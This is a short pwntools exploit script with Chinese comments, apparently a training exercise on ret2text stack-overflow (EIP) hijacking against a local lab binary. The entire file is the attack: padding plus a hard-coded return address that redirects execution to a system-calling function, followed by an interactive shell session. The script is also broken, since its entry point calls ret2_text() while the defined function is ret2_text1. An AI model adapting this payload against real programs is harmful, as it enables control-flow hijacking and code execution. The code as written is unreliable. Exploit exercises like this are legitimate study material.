from pwn import *

'''
    PWN 第一章 控制流（EIP）劫持

    实现方式:
        1.找到代码区（Text）中存放System调用函数
        1.找到栈帧注入、溢出点
        2.定位栈帧溢出点到栈帧临近存放EIP值的距离
        3.劫持栈帧EIP值, 将EIP强制跳转至调用System的函数
'''


def ret2_text1(file_name='/mnt/hgfs/Cyber Security PWN/ROP/ret2text'):
    print('call ret2_text1 start')
    try:
        io = process([file_name])
        print(io.recvline())

        payload = b'A' * 0x10 + b'A' * 0x4 + p32(0x08048522)

        io.sendline(payload)

        io.interactive()

    except Exception:
        return False
    finally:
        print('call ret2_text1 end\n\n')

    return True


if __name__ == '__main__':
    ret2_text()
